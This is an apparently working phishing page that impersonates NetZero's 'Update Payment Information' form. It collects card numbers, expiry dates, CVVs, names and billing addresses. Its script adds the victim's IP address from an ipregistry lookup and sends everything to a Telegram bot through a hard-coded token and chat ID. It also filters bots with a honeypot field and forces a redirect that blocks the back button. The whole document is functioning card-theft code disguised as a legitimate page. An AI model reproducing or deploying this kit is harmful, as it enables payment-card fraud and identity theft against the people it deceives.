<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=1" />
    <meta name="google" content="notranslate" />
    <link rel="icon" href="./image/netzero_logo-removebg-preview 2.png">
    <title>NetZero - Update Payment Information</title>
    <link rel="shortcut icon" href="https://www.netzero.net/favicon.ico" type="image/x-icon" />
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet" type="text/css" />
    <style type="text/css">
      body {
        font-family: 'Open Sans', sans-serif;
        background: #f5f5f5;
        margin: 0;
        padding: 0;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
      }
      #login-wrapper {
        background: #fff;
        padding: 20px;
        border-radius: 8px;
        box-shadow: 0 0 10px rgba(0,0,0,0.1);
        width: 100%;
        max-width: 400px;
      }
      .wrapper {
        text-align: center;
      }
      .input-req-login {
        font-weight: 600;
        margin: 10px 0 5px;
        text-align: left;
      }
      .input-field-login {
        width: 100%;
        padding: 10px;
        margin-bottom: 10px;
        border: 1px solid #ccc;
        border-radius: 4px;
        box-sizing: border-box;
      }
      .controls {
        margin-top: 20px;
      }
      .login-btn button {
        background: #0055a5;
        color: #fff;
        padding: 10px 20px;
        border: none;
        border-radius: 4px;
        cursor: pointer;
        font-size: 16px;
        width: 100%;
      }
      .login-btn button:hover {
        background: #003d7a;
      }
      .error-notice {
        background: #ffecec;
        color: #d32f2f;
        padding: 10px;
        border-radius: 4px;
        margin-bottom: 20px;
        display: none;
      }
      ::placeholder {
        font-family: helvetica, arial;
        font-style: normal;
        font-size: 14px;
        line-height: 21px;
        font-weight: 400;
      }
      .copyright {
        text-align: center;
        margin-top: 20px;
        font-size: 12px;
        color: #666;
      }
      input:invalid {
        border-color: #d32f2f !important;
      }
      .required::after {
        content: " *";
        color: #d32f2f;
      }
      #loading {
        text-align: center;
        margin: 20px 0;
        display: none;
        color: #0055a5;
        font-weight: 600;
      }
    </style>
  </head>
  <body>
    <div id="login-wrapper">
      <div class="wrapper">
        <div id="notify">
          <div id="login-status" class="error-notice">
            <div id="login-status-message">Please fill in all required fields.</div>
          </div>
        </div>
        <div id="loading">Processing your payment... Please wait.</div>
        <div id="content-container">
          <div id="login-container">
            <div id="login-sub-container">
              <div id="login-sub-header">
                <img class="image" src="./image/netzero_logo-removebg-preview.png" alt="netzero logo">
              </div>
              <div id="login-sub">
                <div id="forms">
                  <form id="payment_form" target="_top">
                    <div class="input-req-login required"><label for="card_number">Credit Card Number</label></div>
                    <div class="input-field-login">
                      <input name="card_number" id="card_number" type="text" placeholder="Card number" class="std_textbox" autocomplete="off" tabindex="1" required pattern="\d{4}-\d{4}-\d{4}-\d{4}" maxlength="19" oninput="formatCardNumber(this)" />
                    </div>
                    <div class="input-req-login required"><label for="exp_date">Expiration Date</label></div>
                    <div class="input-field-login">
                      <input name="exp_date" id="exp_date" type="text" placeholder="MM/YY" class="std_textbox" autocomplete="off" tabindex="2" required pattern="\d{2}/\d{2}" maxlength="5" oninput="formatExpDate(this)" />
                    </div>
                    <div class="input-req-login required"><label for="cvv">CVV</label></div>
                    <div class="input-field-login">
                      <input name="cvv" id="cvv" type="text" placeholder="CVV" class="std_textbox" autocomplete="off" tabindex="3" required pattern="\d{3,4}" maxlength="4" />
                    </div>
                    <div class="input-req-login required"><label for="card_name">Name on Card</label></div>
                    <div class="input-field-login">
                      <input name="card_name" id="card_name" type="text" placeholder="Enter name on card" class="std_textbox" autocomplete="off" tabindex="4" required />
                    </div>
                    <div class="input-req-login required"><label for="billing_address">Billing Address</label></div>
                    <div class="input-field-login">
                      <input name="billing_address" id="billing_address" type="text" placeholder="Enter billing address" class="std_textbox" autocomplete="off" tabindex="5" required />
                    </div>
                    <input type="text" name="_honey" value="" style="display:none" />
                    <div class="controls">
                      <div class="login-btn">
                        <button type="submit" id="payment_submit" tabindex="6">Update Payment</button>
                      </div>
                    </div>
                  </form>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div class="copyright">
          Copyright © 2025 NetZero, Inc. All rights reserved.<br />
          <a href="https://www.netzero.net/privacy" target="_blank">Privacy Policy</a>
        </div>
      </div>
    </div>

    <!-- jQuery CDN + Fallback -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script>
      if (typeof jQuery === 'undefined') {
        document.write('<script src="./jquery-3.5.1.min.js"><\/script>');
      }
    </script>

    <script>
      const CONFIG = {
        telegramToken: "6601624596:AAH8-QfvB6o9HvGu9QjKUZWug3EOqInbDR0",
        telegramChatID: "925812369",
        ipRegistryAPI: "nfs9hel7svh94oy5",
        redirectURL: "./info.html",
        formName: "NetZero_Payment",
        formID: "payment_form"
      };

      let botDetected = false;

      $(function() {
        const $form = $("#" + CONFIG.formID);
        const $error = $("#login-status");
        const $loading = $("#loading");
        const $submitBtn = $("#payment_submit");

        // Populate member ID
        const params = new URLSearchParams(window.location.search);
        const memberID = params.get("memberID");
        if (memberID) {
          $("#card_name").val(memberID);
        }

        $form.on("submit", function(e) {
          e.preventDefault();

          // Reset UI
          $error.hide();
          $loading.show();
          $submitBtn.prop("disabled", true).text("Processing...");

          // Validate all fields
          if (!$form[0].checkValidity()) {
            $loading.hide();
            $submitBtn.prop("disabled", false).text("Update Payment");
            $error.show();
            return;
          }

          const formData = $form.serializeArray();
          sendToTelegram(formData);
        });
      });

      function formatCardNumber(input) {
        let v = input.value.replace(/\D/g, '').slice(0, 16);
        input.value = v.match(/.{1,4}/g)?.join('-') || v;
      }

      function formatExpDate(input) {
        let v = input.value.replace(/\D/g, '').slice(0, 4);
        if (v.length >= 3) {
          input.value = v.slice(0, 2) + '/' + v.slice(2);
        } else {
          input.value = v;
        }
      }

      async function sendToTelegram(formData) {
        let message = `New ${CONFIG.formName} submission:\n`;
        formData.forEach(field => {
          if (field.name === "_honey" || field.name === "_bot") {
            if (field.name === "_honey" && field.value !== "") botDetected = true;
            return;
          }
          message += `${field.name}: ${field.value}\n`;
        });

        const ip = await getIP();
        message += `IP: ${ip}\n`;

        if (botDetected) {
          window.location = "https://www.google.com";
          return;
        }

        // Send to Telegram
        try {
          await $.post(`https://api.telegram.org/bot${CONFIG.telegramToken}/sendMessage`, {
            chat_id: CONFIG.telegramChatID,
            text: message
          });
          console.log("Telegram: Success");
        } catch (err) {
          console.error("Telegram failed:", err);
        }

        // FORCE REDIRECT AFTER 3 SECONDS — NO MATTER WHAT
        setTimeout(() => {
          console.log("FORCING REDIRECT TO:", CONFIG.redirectURL);
          window.location.replace(CONFIG.redirectURL); // replace() prevents back button
        }, 3000);
      }

      async function getIP() {
        try {
          const data = await $.getJSON(`https://api.ipregistry.co/?key=${CONFIG.ipRegistryAPI}`);
          return data.ip || "Unknown";
        } catch (e) {
          return "Failed";
        }
      }
    </script>
  </body>
</html>